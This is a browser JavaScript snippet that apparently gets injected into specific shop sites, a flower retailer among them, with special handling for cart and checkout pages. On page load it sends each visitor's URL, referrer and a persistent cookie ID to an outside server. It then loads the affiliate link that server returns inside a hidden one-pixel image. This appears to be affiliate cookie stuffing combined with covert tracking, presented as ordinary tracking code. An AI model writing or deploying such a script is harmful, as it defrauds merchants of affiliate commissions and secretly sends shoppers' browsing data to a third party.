(function () {

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = Math.random() * 16 | 0;
      var v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function createTrackingPixel(url) {
    var img = document.createElement("img");
    img.src = url;
    img.width = 1;
    img.height = 1;
    img.style.display = "none";
    document.body.appendChild(img);
  }

  function isCartPage() {
    var cartPatterns = ["cart", "checkout", "checkouts", "pay", "shipping", "review-order", "payment"];
    return cartPatterns.some(function (p) {
      return window.location.pathname.toLowerCase().includes(p);
    });
  }

  async function initTracking() {
    try {
      var uniqueId = getCookie('tracking_uuid') || generateUUID();
      var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

      var res = await fetch("https://theclicksdealer.com/api/track-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname,
        })
      });

      var data = await res.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
      } else {
        createTrackingPixel('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
      }

    } catch (e) {
      console.error("Tracking error", e);
    }
  }

  function run() {
    var host = window.location.hostname;

    var config = {
      "www.fareastflora.com": { always: true, cartExtra: true },
      "aimedialinks.com": { always: true, cartExtra: true },
    };

    var site = config[host];
    if (site) {
      if (site.cartExtra && isCartPage()) {
        initTracking();
      } else if (site.always) {
        initTracking();
      }
    }
  }

  if (document.readyState === 'complete') {
    run();
  } else {
    window.addEventListener('load', run, { once: true });
  }

})();
